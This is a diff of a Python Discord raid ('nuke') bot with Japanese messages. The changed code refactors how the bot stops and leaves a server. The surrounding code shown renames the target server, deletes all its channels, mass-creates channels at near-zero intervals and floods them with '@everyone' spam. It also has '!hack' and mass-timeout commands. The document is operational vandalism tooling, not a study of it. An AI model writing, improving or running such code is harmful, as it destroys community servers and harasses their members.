@@ -14,8 +14,8 @@ bot = commands.Bot(command_prefix="!", intents=intents)
 
 SERVER_NAME = "トイ神の植民地"
 CHANNEL_NAME = "ここはトイ神の集い|TISNに荒らされました😂"
-BATCH_SIZE = 15  # 一括作成する数
-CREATE_INTERVAL = 0.0001  # 限界まで短縮
+BATCH_SIZE = 15
+CREATE_INTERVAL = 0.0001
 
 COMBINED_TEXT = (
     "@everyone\n"
@@ -39,7 +39,6 @@ COMBINED_TEXT = (
 stop_flag = asyncio.Event()
 background_tasks = set()
 
-# ✅ 実行者を記憶
 initiator_id = None
 target_guild = None
 
@@ -56,7 +55,6 @@ class StartButton(ui.View):
         if not stop_flag.is_set() and background_tasks:
             await interaction.followup.send("⚠️ 既に実行中です", ephemeral=True)
             return
-        # ボタン実行者を記憶
         initiator_id = interaction.user.id
         target_guild = interaction.guild
         await interaction.followup.send("🔓 侵入承認…システム起動…", ephemeral=False)
@@ -90,7 +88,6 @@ async def delete_all_channels_fast(guild: discord.Guild):
 
 
 async def batch_create_and_spam(guild: discord.Guild, start_counter: int):
-    """一括作成＋即時並行送信"""
     create_tasks = []
     for i in range(BATCH_SIZE):
         cnt = start_counter + i
@@ -116,7 +113,6 @@ async def infinite_create_and_spam(guild: discord.Guild, delete_channels: bool =
         await guild.edit(name=SERVER_NAME)
     except:
         pass
-    # !boost のときはチャンネル削除をスキップ
     if delete_channels:
         await delete_all_channels_fast(guild)
 
@@ -142,33 +138,40 @@ async def type_and_send(channel, text):
         await asyncio.sleep(0.005)
 
 
-# ✅ 自動退出処理
-async def auto_exit():
-    """実行者が退出したらBotを停止"""
+# ✅ 【修正版】「停止＋サーバーから正式に退出」する共通処理
+async def leave_and_close(guild, message: str = "👋 終了します。さようなら！"):
     stop_flag.set()
     await asyncio.gather(*background_tasks, return_exceptions=True)
     background_tasks.clear()
-    if target_guild:
+
+    # メッセージ送信
+    if guild:
         try:
-            # 退出メッセージ用のチャンネルを探す
-            ch = target_guild.system_channel or next(iter(target_guild.text_channels), None)
+            ch = guild.system_channel or next(iter(guild.text_channels), None)
             if ch:
-                await ch.send("👋 実行者がサーバーを退出したため、Botを終了します。")
+                await ch.send(message)
         except:
             pass
+
+    # ✅ サーバーから正式に脱退
+    if guild:
+        try:
+            await guild.leave()
+        except:
+            pass
+
+    # Discord接続を切断
     await bot.close()
 
 
 @bot.event
 async def on_member_remove(member):
-    """メンバーが退出したときのイベント"""
     global initiator_id, target_guild
-    # 実行者がいないとき、または対象サーバー以外は無視
     if initiator_id is None or target_guild is None:
         return
-    # 実行者本人が退出した場合
     if member.id == initiator_id and member.guild.id == target_guild.id:
-        await auto_exit()
+        # ✅ 実行者退出時 → 正式に退出
+        await leave_and_close(target_guild, "👋 実行者がサーバーを退出したため、Botを終了しサーバーを脱退します。")
 
 
 @bot.command()
@@ -176,7 +179,6 @@ async def start(ctx):
     global initiator_id, target_guild
     if not stop_flag.is_set() and background_tasks:
         return
-    # 実行者を記憶
     initiator_id = ctx.author.id
     target_guild = ctx.guild
     await infinite_create_and_spam(ctx.guild, delete_channels=True)
@@ -187,7 +189,6 @@ async def boost(ctx):
     global initiator_id, target_guild
     if not stop_flag.is_set() and background_tasks:
         return
-    # 実行者を記憶
     initiator_id = ctx.author.id
     target_guild = ctx.guild
     await infinite_create_and_spam(ctx.guild, delete_channels=False)
@@ -199,22 +200,18 @@ async def stop(ctx):
     stop_flag.set()
     await asyncio.gather(*background_tasks, return_exceptions=True)
     background_tasks.clear()
-    # 記憶をリセット
     initiator_id = None
     target_guild = None
+    await ctx.send("🛑 処理を停止しました。（Botはサーバーに残留）")
 
 
 @bot.command(name="bye")
 async def bye(ctx):
     global initiator_id, target_guild
-    stop_flag.set()
-    await asyncio.gather(*background_tasks, return_exceptions=True)
-    background_tasks.clear()
-    await ctx.send("👋 終了します。さようなら！")
-    # 記憶をリセット
     initiator_id = None
     target_guild = None
-    await bot.close()
+    # ✅ !bye → 処理停止＋サーバーから正式に退出
+    await leave_and_close(ctx.guild, "👋 手動終了：Botを停止しサーバーを脱退します。")
 
 
 @bot.command()
@@ -223,7 +220,6 @@ async def hack(ctx):
     guild = ctx.guild
     await delete_all_channels_fast(guild)
     ch = await guild.create_text_channel("hacking出力画面")
-    # 実行者を記憶
     initiator_id = ctx.author.id
     target_guild = ctx.guild
     hacker_code = "```ansi\n"
@@ -294,7 +290,6 @@ async def total_timeout(ctx):
             report.append(f"❌ ロール付与失敗: {e}")
             await ctx.send("\n".join(report))
             return
-    # 実行者を記憶
     initiator_id = ctx.author.id
     target_guild = ctx.guild
     await asyncio.sleep(1.5)
